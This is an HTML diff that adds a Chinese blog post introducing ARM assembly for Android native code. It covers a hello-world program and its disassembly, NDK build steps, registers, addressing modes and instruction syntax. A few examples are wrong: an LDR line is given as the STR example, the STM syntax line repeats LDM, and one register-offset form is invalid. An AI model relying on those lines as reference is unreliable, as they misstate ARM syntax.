@@ -150,6 +150,678 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Hello-ARM" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/22/Hello-ARM/">Hello ARM</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/22/Hello-ARM/" class="archive-article-date">
+  	<time datetime="2018-08-22T07:49:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-22</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Hello-ARM"><a href="#Hello-ARM" class="headerlink" title="Hello ARM"></a>Hello ARM</h2><p><strong>这是一篇ARM基本简介与指令介绍集合~</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Hello ARM!\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拖入IDA pro=对应main入口处</span></span><br><span class="line">                 EXPORT main						<span class="comment">//表明这个main函数是被程序导出</span></span><br><span class="line">.text:<span class="number">000082E0</span> main         ; CODE XREF: j_mainj</span><br><span class="line">.text:<span class="number">000082E0</span></span><br><span class="line">.text:<span class="number">000082E0</span> var_C  = <span class="number">-0xC</span>						<span class="comment">//栈变量</span></span><br><span class="line">.text:<span class="number">000082E0</span> var_8  = <span class="number">-8</span>							<span class="comment">//栈变量</span></span><br><span class="line">.text:<span class="number">000082E0</span>							</span><br><span class="line">.text:<span class="number">000082E0</span>  STMFD   SP!, &#123;R11,LR&#125;				<span class="comment">//把寄存器的值压入堆栈</span></span><br><span class="line">.text:<span class="number">000082E4</span>  ADD     R11, SP, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">000082E8</span>  SUB     SP, SP, #<span class="number">8</span></span><br><span class="line">.text:<span class="number">000082</span>EC  STR     R0, [R11,#var_8]			<span class="comment">//将R0寄存器的值保存到栈变量var_8中</span></span><br><span class="line">.text:<span class="number">000082F</span>0  STR     R1, [R11,#var_C]</span><br><span class="line">.text:<span class="number">000082F</span>4  LDR     R3, =(aHelloArm - <span class="number">0x8300</span>)</span><br><span class="line">.text:<span class="number">000082F</span>8  ADD     R3, PC, R3      ; <span class="string">"Hello ARM!"</span></span><br><span class="line">.text:<span class="number">000082F</span>C  MOV     R0, R3          ; s			<span class="comment">//把R3寄存器的值赋给R0寄存器</span></span><br><span class="line">.text:<span class="number">00008300</span>  BL      <span class="built_in">puts</span>						<span class="comment">//调用puts函数</span></span><br><span class="line">.text:<span class="number">00008304</span>  MOV     R3, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">00008308</span>  SUB     SP, R11, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">00008310</span>  LDMFD   SP!, &#123;R11,PC&#125;				<span class="comment">//用于从堆栈中恢复寄存器的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//STMFD与LDMFD是堆栈寻址指令</span></span><br><span class="line"><span class="comment">//STR与LDR是存储器访问指令</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="原生程序生成过程"><a href="#原生程序生成过程" class="headerlink" title="原生程序生成过程"></a>原生程序生成过程</h3><p>原生程序的代码是由Android NDK中提供的交叉编译（跨平台编译）工具链中的gcc编译器来编译的（交叉编译工具链：能在一种平台上编译出另一种平台上运行的程序的工具集合）</p>
+<ul>
+<li>预处理<ul>
+<li>“#include”包含的头文件会全部被编译进来，“#define”预定义、“#if”预条件处理等</li>
+<li><code>gcc -E hello.c -o hello.i</code>(gcc能搜索到Android NDK头文件路径)</li>
+</ul>
+</li>
+<li>编译<ul>
+<li>检查代码的规范性，以及是否有语法错误，gcc编译器把代码翻译成ARM汇编语言的代码</li>
+<li><code>gcc –S hello.i–o hello.s</code></li>
+</ul>
+</li>
+<li>汇编<ul>
+<li>gcc编译器会调用汇编器将汇编代码汇编成二进制目标文件</li>
+<li><code>gcc –c hello.s –o hello.o</code>.</li>
+</ul>
+</li>
+<li>链接<ul>
+<li>调用链接器将二进制的目标文件链接成Android平台可执行的ARM原生程序</li>
+<li><code>gcc hello.o –o hello</code><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#makefile</span></span><br><span class="line">NDK_ROOT=c:/android-ndk-r8 <span class="comment">#路径</span></span><br><span class="line">TOOLCHAINS_ROOT=<span class="variable">$(NDK_ROOT)</span>/toolchains/arm-linux-androideabi-4.4.3/prebuilt/windows</span><br><span class="line">TOOLCHAINS_PREFIX=<span class="variable">$(TOOLCHAINS_ROOT)</span>/bin/arm-linux-androideabi</span><br><span class="line">TOOLCHAINS_INCLUDE=<span class="variable">$(TOOLCHAINS_ROOT)</span>/lib/gcc/arm-linux-androideabi/4.4.3/include-fixed</span><br><span class="line">PLATFORM_ROOT=<span class="variable">$(NDK_ROOT)</span>/platforms/android-14/arch-arm</span><br><span class="line">PLATFORM_INCLUDE=<span class="variable">$(PLATFORM_ROOT)</span>/usr/<span class="keyword">include</span></span><br><span class="line">PLATFORM_LIB=<span class="variable">$(PLATFORM_ROOT)</span>/usr/lib</span><br><span class="line">MODULE_NAME=hello</span><br><span class="line">RM=del</span><br><span class="line">FLAGS=-I<span class="variable">$(TOOLCHAINS_INCLUDE)</span> \</span><br><span class="line">	-I<span class="variable">$(PLATFORM_INCLUDE)</span> \</span><br><span class="line">	-L<span class="variable">$(PLATFORM_LIB)</span> \</span><br><span class="line">	-nostdlib \</span><br><span class="line">	-lgcc \</span><br><span class="line">	-Bdynamic \</span><br><span class="line">	-lc</span><br><span class="line">OBJS=<span class="variable">$(MODULE_NAME)</span>.o \</span><br><span class="line">	<span class="variable">$(PLATFORM_LIB)</span>/crtbegin_dynamic.o \</span><br><span class="line">	<span class="variable">$(PLATFORM_LIB)</span>/crtend_android.o</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	<span class="variable">$(TOOLCHAINS_PREFIX)</span>-gcc <span class="variable">$(FLAGS)</span> -c <span class="variable">$(MODULE_NAME)</span>.c -o <span class="variable">$(MODULE_NAME)</span>.o</span><br><span class="line">	<span class="variable">$(TOOLCHAINS_PREFIX)</span>-gcc <span class="variable">$(FLAGS)</span> <span class="variable">$(OBJS)</span> -o <span class="variable">$(MODULE_NAME)</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o</span><br><span class="line"><span class="section">install:</span></span><br><span class="line">	adb push <span class="variable">$(MODULE_NAME)</span> /data/local/</span><br><span class="line">	adb shell chmod 755 /data/local/<span class="variable">$(MODULE_NAME)</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h3><ul>
+<li>ARM微处理器共有37个32位寄存器，其中31个为通用寄存器，6个为状态寄存器</li>
+<li>ARM处理器七种运行模式:2-7为特权模式</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1．用户模式（usr）：ARM处理器正常的程序执行状态。</span><br><span class="line">2．快速中断模式（fiq）：用于高速数据传输或通道处理。</span><br><span class="line">3．外部中断模式（irq）：用于通用的中断处理。</span><br><span class="line">4．管理模式（svc）：操作系统使用的保护模式。</span><br><span class="line">5．数据访问终止模式（abt）：当数据或指令预取终止时进入该模式，可用于虚拟存储及存储保护。</span><br><span class="line">6．系统模式（sys）：运行具有特权的操作系统任务。</span><br><span class="line">7．未定义指令中止模式（und）：当未定义的指令执行时进入该模式。</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>用户模式下，处理器可以访问的寄存器为<u>不分组寄存器R0～R7、分组寄存器R8～R14、程序计数器R15（PC）以及当前程序状态寄存器CPSR</u></p>
+</li>
+<li><p>ARM处理器有两种工作状态：<strong>ARM状态与Thumb状态</strong>，可以在两种状态之间随意切换。</p>
+<ul>
+<li>ARM状态时，执行32位字对齐的ARM指令</li>
+<li>Thumb状态时，执行16位对齐的Thumb指令</li>
+</ul>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//Thumb状态下对寄存器的命名与ARM有部分差异</span><br><span class="line">●　Thumb状态下的R0～R7与ARM状态下的R0～R7相同。</span><br><span class="line">●　Thumb状态下的CPSR与ARM状态下的CPSR相同。</span><br><span class="line">●　Thumb状态下的FP对应于ARM状态下的R11。</span><br><span class="line">●　Thumb状态下的IP对应于ARM状态下的R12。</span><br><span class="line">●　Thumb状态下的SP对应于ARM状态下的R13。</span><br><span class="line">●　Thumb状态下的LR对应于ARM状态下的R14。</span><br><span class="line">●　Thumb状态下的PC对应于ARM状态下R15</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="ARM程序结构"><a href="#ARM程序结构" class="headerlink" title="ARM程序结构"></a>ARM程序结构</h3><p>Android平台的ARM汇编是GNU ARM汇编格式，使用的汇编器（汇编器的功能是将汇编代码转换为二进制目标文件）为GAS（GNU Assembler，GNU汇编器），<a href="http://sourceware.org/binutils/docs/as/index.html" target="_blank" rel="noopener">语法结构在线手册</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">    .arch armv5te            	@处理器架构</span><br><span class="line">    .fpu softvfp             	@浮点协处理器类型 </span><br><span class="line">    .eabi_attribute 20, 1    	@接口属性</span><br><span class="line">    .eabi_attribute 21, 1</span><br><span class="line">    .eabi_attribute 23, 3</span><br><span class="line">    .eabi_attribute 24, 1</span><br><span class="line">    .eabi_attribute 25, 1</span><br><span class="line">    .eabi_attribute 26, 2</span><br><span class="line">    .eabi_attribute 30, 6</span><br><span class="line">    .eabi_attribute 18, 4</span><br><span class="line">    .file   &quot;hello.c&quot;       	@源文件名</span><br><span class="line">    .section    .rodata         @声明只读数据</span><br><span class="line">    .align  2               	@声明对齐方式2^2=4字节</span><br><span class="line">.LC0:                      		@标号LC0</span><br><span class="line">    .ascii  &quot;Hello ARM!\000&quot;	@声明字符串</span><br><span class="line">    .text                    	@声明代码段</span><br><span class="line">    .align  2               	@声明对齐方式4字节</span><br><span class="line">    .global main            	@全局符号main</span><br><span class="line">    .type   main, %function 	@main类型为函数</span><br><span class="line">main:                        	@标号main</span><br><span class="line">    @ args = 0, pretend = 0, frame = 8</span><br><span class="line">    @ frame_needed = 1, uses_anonymous_args = 0</span><br><span class="line">    stmfd   sp!, &#123;fp, lr&#125;   	@将fp，lr压入堆栈</span><br><span class="line">    add fp, sp, #4           	@初始化fp寄存器，设置栈帧，用于访问局部变量</span><br><span class="line">    sub sp, sp, #8           	@开辟栈空间</span><br><span class="line">    str r0, [fp, #-8]        	@保存第一个参数</span><br><span class="line">    str r1, [fp, #-12]      	@保存第二个参数</span><br><span class="line">    ldr r3, .L3              	@取标号.L3处的内容，</span><br><span class="line">.LPIC0:							@标号.LPIC0</span><br><span class="line">    add r3, pc, r3				@计算字符串的内存地址</span><br><span class="line">    mov r0, r3					@设置参数1</span><br><span class="line">    bl  puts(PLT)				@调用puts函数</span><br><span class="line">    mov r3, #0					@设置r3寄存器的值为0</span><br><span class="line">    mov r0, r3					@程序返回结果为0</span><br><span class="line">    sub sp, fp, #4				@恢复sp寄存器的值</span><br><span class="line">    ldmfd   sp!, &#123;fp, pc&#125;		@恢复fp寄存器，并将1r寄存器值赋给pc寄存器</span><br><span class="line">.L4:							@标号.L4</span><br><span class="line">    .align  2					@声明对齐方式4字节</span><br><span class="line">.L3:							@标号.L3</span><br><span class="line">    .word   .LC0-(.LPIC0+8)		@保存字符串相对“add r3, pc, r3”的偏移量</span><br><span class="line">    .size   main, .-main		@main函数的大小为当前代码行减去main标号</span><br><span class="line">    .ident  &quot;GCC: (GNU) 4.4.3&quot;	@编译器标识</span><br><span class="line">    .section    .note.GNU-stack,&quot;&quot;,%progbits	@定义.note.GNU-stack段</span><br><span class="line">；；；；；；；；；</span><br><span class="line">框架：处理器架构定义、数据段、代码段与main函数</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>处理器架构定义</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.arch armv5te            @处理器架构</span><br><span class="line">.fpu softvfp             @浮点协处理器类型 </span><br><span class="line">.eabi_attribute 20, 1    @接口属性</span><br><span class="line">.eabi_attribute 21, 1	</span><br><span class="line">.eabi_attribute 23, 3</span><br><span class="line">.eabi_attribute 24, 1</span><br><span class="line">.eabi_attribute 25, 1</span><br><span class="line">.eabi_attribute 26, 2</span><br><span class="line">.eabi_attribute 30, 6</span><br><span class="line">.eabi_attribute 18, 4</span><br></pre></td></tr></table></figure>
+<p><strong>EABI</strong>（Embedded Application Binary Interface，嵌入式应用二进制接口）是ARM制定的一套接口规范,属性值在编译多数程序时都是固定的.</p>
+<ul>
+<li><strong>段定义</strong></li>
+</ul>
+<p>ARM汇编使用“.section”指令来定义段：<code>.section name[,&quot;flags&quot;[,%type[,flag_specifi_arguments]]]</code></p>
+<p>eg:name为段名，flags为段的属性如读、写、可执行等，type指定了段的类型，如progbits表示段中包含有数据、note表示段中包含的数据非程序本身使用，flag_specific_arguments指定了一些平台相关的参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.section    .rodata						定义只读数据段，属性采用默认</span><br><span class="line">.text									定义了代码段，没有使用.section关键字</span><br><span class="line">.section .note.GNU-stack,&quot;&quot;,%progbits	定义.note.GNU-stack段，它的作用是禁止生成可执行堆栈，用来保护代码安全</span><br></pre></td></tr></table></figure>
+<ul>
+<li>汇编器指令</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.file：指定了源文件名。</span><br><span class="line">.align：指定代码对齐方式，后面跟的数值为2的次数方。如“.align 4”表示2^4=16字节对齐。</span><br><span class="line">.ascii：声明字符串。</span><br><span class="line">.global：声明全局符号。全局符号是指在本程序外可以访问的符号。</span><br><span class="line">.type：指定符号的类型。“.type main, %function”表示main符号为函数。</span><br><span class="line">.word：用来存放地址值。“.word .LC0-(.LPIC0+8)”存放的是一个与地址无关的偏移量。</span><br><span class="line">.size：设置指定符号的大小。“.size main, .-main”中的点“.”表示当前地址，减去main符号的地址即为整个main函数的大小。</span><br><span class="line">.ident：编译器标识，无实际用途，生成可执行程序后它的值被放置到“.comment”段中。</span><br></pre></td></tr></table></figure>
+<h3 id="ARM寻址方式"><a href="#ARM寻址方式" class="headerlink" title="ARM寻址方式"></a>ARM寻址方式</h3><ul>
+<li>立即寻址  <code>MOV R0,#1234</code></li>
+<li>寄存器选  <code>MOV R0,R1</code></li>
+<li>寄存器移位寻址 <code>MOV R0,R1,LSL #2</code> R1寄存器左移2位，“R1 &lt;&lt; 2”后赋值给R0寄存器，R0=R1*4</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">操作前需要对源寄存器操作数进行移位操作:</span><br><span class="line">LSL：逻辑左移，移位后寄存器空出的低位补0。</span><br><span class="line">LSR：逻辑右移，移位后寄存器空出的高位补0。</span><br><span class="line">ASR：算术右移，移位过程中符号位保持不变，如果源操作数为正数，则移位后空出的高位补0，否则补1。</span><br><span class="line">ROR：循环右移，移位后移出的低位填入移位空出的高位。</span><br><span class="line">RRX：带扩展的循环右移，操作数右移一位，移位空出的高位用C标志的值填充。</span><br></pre></td></tr></table></figure>
+<ul>
+<li>寄存器间接寻址 <code>LDR R0,[R1]</code> 将R1寄存器的数值作为地址，取出地址中的值赋给R0寄存器</li>
+<li>基址寻址 <code>LDR R0,[R1, #-4]</code></li>
+<li>多寄存器寻址 <code>LDMIA R0,{R1,R2,R3,R4}</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDM是数据加载指令，指令的后缀IA表示每次执行完加载操作后R0寄存器的值自增1个字，</span><br><span class="line">ARM指令集中，字表示的是一个32位的数值。这条指令执行后，R1=[R0]，R2=[R0+#4]，R3=[R0+#8]，R4=[R0+#12]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>堆栈寻址<ul>
+<li>ARM处理器特有寻址方式，堆栈寻址的指令有<code>LDMFA/STMFA、LDMEA/STMEA、LDMFD/STMFD、LDMED/STMED</code></li>
+</ul>
+</li>
+<li>块拷贝寻址：实现连续地址数据从存储器的某一位置拷贝到另一位置<ul>
+<li>块拷贝寻址的指令有<code>LDMIA/STMIA、LDMDA/STMDA、LDMIB/STMIB、LDMDB/STMDB</code></li>
+</ul>
+</li>
+<li>相对寻址：程序计数器PC的当前值为基地址，地址标号作为偏移量，将两者相加之后得到操作数的有效地址</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BL NEXT</span><br><span class="line">.....</span><br><span class="line">NEXT:</span><br><span class="line">.....</span><br><span class="line">@@@BL NEXT 是跳到NEXT标号处执行，BL采用的就是相对寻址，标号NEXT是偏移量</span><br></pre></td></tr></table></figure>
+<h3 id="ARM与Thumb指令集"><a href="#ARM与Thumb指令集" class="headerlink" title="ARM与Thumb指令集"></a>ARM与Thumb指令集</h3><h4 id="1-指令格式"><a href="#1-指令格式" class="headerlink" title="1.指令格式"></a>1.指令格式</h4><p><em>\<opcode>{\<cond>}{S}{.W|.N}\<rd>,\<rn>{,\<operand2>}</operand2></rn></rd></cond></opcode></em>        :opcode指令助记符，</p>
+<p>cond为执行条件，取值表：</p>
+<p><img src="/2018/08/22/Hello-ARM/1.png" alt="1"></p>
+<p>S指定指令是否影响CPSR寄存器的值。如ADDS、SUBS等，.W与.N为指令宽度说明符。（默认会生成16位的代码，.w为32，.N为16）。Rd为目的寄存器，Rn为第一个操作数寄存器，operand2为第二个操作数。第二个操作数可以是立即数、寄存器或寄存器移位操作。</p>
+<h4 id="2-跳转指令"><a href="#2-跳转指令" class="headerlink" title="2.跳转指令"></a>2.跳转指令</h4><p>两种方式可以实现程序跳转：一种是使用跳转指令直接跳转；一种是给PC寄存器直接赋值实现跳转。</p>
+<ul>
+<li><strong>B跳转指令</strong>    <em>B{cond}label</em></li>
+<li><strong>BL带链接的跳转指令</strong>  <em>BL{cond}label</em><ul>
+<li>当执行BL指令时，如果条件cond满足，会首先将当前指令的下一条指令的地址拷贝到R14（即LR）寄存器中，然后跳转到lable指定的地址处继续执行</li>
+<li>可以通过“<code>MOV PC, LR</code>”返回到主程序</li>
+</ul>
+</li>
+<li><strong>BX带状态切换的跳转指令</strong>  <em>BX{cond}Rm</em><ul>
+<li>当执行BX指令时，如果条件cond满足，则处理器会判断Rm的位[0]是否为1，</li>
+<li>如果为1则跳转时自动将CPSR寄存器的标志T置位，并将目标地址处的代码解释为Thumb代码来执行，即处理器会切换至Thumb状态；</li>
+<li>若Rm的位[0]为0，则跳转时自动将CPSR寄存器的标志T复位，并将目标地址处的代码解释为ARM代码来执行，即处理器会切换到ARM状态</li>
+</ul>
+</li>
+<li><strong>BLX带链接和状态切换的跳转指令</strong>  <em>BLX{cond}Rm</em> <ul>
+<li>BLX指令集合了BL与BX的功能，当条件满足时，除了设置链接寄存器，还根据Rm位[0]的值来切换处理器状态</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-存储器访问指令"><a href="#3-存储器访问指令" class="headerlink" title="3.存储器访问指令"></a>3.存储器访问指令</h4><ul>
+<li><p><strong>LDR</strong> 从存储器中加载数据到寄存器中</p>
+<ul>
+<li><p><em>LDR{type}{cond}Rd,label</em>   &amp;&amp; <em>LDRD{cond}Rd,Rd2,label</em></p>
+</li>
+<li><p>type指明了操作的数据的大小</p>
+<p><img src="/2018/08/22/Hello-ARM/2.png" alt="2"></p>
+</li>
+<li><p>cond为执行条件，Rt为要加载的寄存器</p>
+</li>
+<li><p>label为要读取的内存地址：三种表示方法</p>
+<ul>
+<li>1.直接偏移量，eg：LDR R8, [R9, #04] 、LDR R8, [R9], #04</li>
+<li>2.寄存器偏移,   eg:  LDR R8, [R9, R10, #04]</li>
+<li>3.相对PC,    eg：LDR R8, label1</li>
+</ul>
+</li>
+<li><p>LDRD一次加载双字的数据，将数据加载到Rd与Rd2寄存器中。</p>
+<ul>
+<li><code>LDRD R0,R1,label12</code> 从标号label12指向的内存中加载两个字的数据到R0与R1寄存器中。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>STR</strong> 存储数据到指定地址的存储单元</p>
+<ul>
+<li><em>STR{type}{cond}Rd,label</em>   &amp;&amp; <em>STRD{cond}Rd,Rd2,label</em></li>
+<li>type中的SB与SH对STR无效</li>
+<li><code>LDR R0, [R2, #04]</code> 将R0寄存器的数据存储到R2+4所指向的存储单元</li>
+</ul>
+</li>
+<li><p><strong>LDM</strong> 从指定的存储单元加载多个数据到一个寄存器列表</p>
+<ul>
+<li><em>LDM{addr_mode}{cond}Rn{!}reglist</em></li>
+<li>addr_mode取值:<img src="/2018/08/22/Hello-ARM/3.png" alt="3"></li>
+<li>cond为执行条件。Rn为基地寄存器，用于存储初始地址。！为可选的后缀。有！，则最终地址将写回到Rn寄存器中。</li>
+<li>reglist为用来存储数据的寄存器列表，用大括号括起来。</li>
+<li><code>LDMIA R0!,{R1-R3}</code>  依次加载R0指向的存储单元的数据到R1，R2，R3寄存器中</li>
+</ul>
+</li>
+<li><p><strong>STM</strong> 将一个寄存器列表的数据存储到指定的存储单元</p>
+<ul>
+<li><em>LDM{addr_mode}{cond}Rn{!}reglist</em></li>
+<li><code>STMDB R1!,{R3-R6,R11}</code>   将R3-R6，R11寄存器的内容存储到R1指向的存储单元</li>
+</ul>
+</li>
+<li><p><strong>PUSH</strong>  将寄存器推入满递减堆栈  <em>PUSH{cond}reglist</em></p>
+</li>
+<li><p><strong>POP</strong> 从满递减堆栈中弹出数据到寄存器   <em>POP{cond}reglist</em></p>
+</li>
+<li><p><strong>SWP</strong> 用于寄存器与存储器之间的数据交换 <em>SWP{B}{cond}Rd,Rm,[Rn]</em></p>
+<ul>
+<li>B是可选的字节，若有B，则交换字节，否则交换32位的字,cond为执行条件,Rd为要从存储器中加载数据的寄存器,Rm为写入数据到存储器的寄存器,Rn为需要进行数据交换的存储器地址。Rn不能与Rd和Rm相同。</li>
+<li>如果Rd与Rm相同，可实现单个寄存器与存储器的数据交换。<ul>
+<li><code>SWP R1,R1,[R0]</code>      将R1寄存器与R0指向的存储单元的内容进行交换</li>
+<li><code>SWPB R1,R2,[R0]</code>    从R0指向的存储单元读取一个字节存入R1（高24位清零），然后将R2寄存器的字节内容存储到该存储单元。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-数据处理指令"><a href="#4-数据处理指令" class="headerlink" title="4.数据处理指令"></a>4.数据处理指令</h4><p>所有的数据处理指令均<u>可选择使用S后缀，来决定是否影响状态标志</u>，比较指令不需要S后缀，它们会直接影响状态标志。</p>
+<ul>
+<li><p>数据传送指令</p>
+<ul>
+<li><strong>MOV</strong> 将8位的立即数或寄存器的内容传送到目标寄存器中 <em>MOV {cond}{S}Rd,operand2</em></li>
+<li><strong>MVN</strong>为数据非传送指令 ：将8位的立即数或寄存器按位取反后传送到目标寄存器中</li>
+</ul>
+</li>
+<li><p>算术运算指令</p>
+<ul>
+<li><strong>ADD</strong> 将Rn寄存器与operand2的值相加，结果保存到Rd寄存器 <em>ADD {cond}{S}Rd,Rn,operand2</em></li>
+<li><strong>ADC</strong>为带进位加法指令 :将Rn寄存器与operand2的值相加，再加上CPSR寄存器的C条件标志位的值，最后将结果保存到Rd寄存器 <em>ADC{cond}{S}Rd,Rn,operand2</em></li>
+<li><strong>SUB</strong> 用Rn寄存器减去operand2的值，结果保存到Rd寄存器中 <em>SUB {cond}{S}Rd,Rn,operand2</em></li>
+<li><strong>RSB</strong> 为逆向减法指令: 用operand2减去Rn寄存器，结果保存到Rd寄存器中 <em>RSB {cond}{S}Rd,Rn,operand2</em></li>
+<li><strong>SBC</strong> 为带进位减法指令: 用Rn寄存器减去operand2的值，再减去CPSR寄存器的C条件标志位的值，最后将结果保存到Rd寄存器 <em>SBC {cond}{S}Rd,Rn,operand2</em></li>
+<li><strong>RSC</strong> 为带进位逆向减法指令:用operand2减去Rn寄存器，再减去CPSR寄存器的C条件标志位的值，最后将结果保存到Rd寄存器 <em>RSC {cond}{S}Rd,Rn,operand2</em></li>
+<li><strong>MUL</strong> 为32位乘法指令,将Rm寄存器与Rn寄存器的值相乘，结果的低32位保存到Rd寄存器.<em>MUL {cond}{S}Rd,Rm,Rn</em></li>
+<li><strong>MLS</strong> 将Rm寄存器和Rn寄存器中的值相乘，然后再从Ra寄存器的值中减去乘积，最后将所得结果的低32位存入Rd寄存器中 <em>MLS {cond}{S}Rd,Rm,Rn,Ra</em></li>
+<li><strong>MLA</strong> 将Rm寄存器和Rn寄存器中的值相乘，然后再将乘积与Ra寄存器中的值相加，最后将结果的低32位存入Rd寄存器中 <em>MLA {cond}{S}Rd,Rm,Rn,Ra</em></li>
+<li><strong>UMULL</strong> UMULL指令将Rm寄存器和Rn寄存器的值作为无符号数相乘，然后将结果的低32位存入RdLo寄存器，高32位存入RdHi寄存器 <em>UMULL {cond}{S}RdLo,RdHi,Rm,Rn</em></li>
+<li><strong>UMLAL</strong> 将Rm寄存器和Rn寄存器的值作为无符号数相乘，然后将64位的结果与RdHi、RdLo组成的64位数相加，结果的低32位存入RdLo寄存器，高32位存入RdHi寄存器 <em>UMLAL {cond}{S}RdLo,RdHi,Rm,Rn</em></li>
+<li><strong>SMULL</strong> 将Rm寄存器和Rn寄存器的值作为有符号数相乘，然后将结果的低32位存入RdLo寄存器，高32位存入RdHi寄存器 <em>SMULL {cond}{S}RdLo,RdHi,Rm,Rn</em></li>
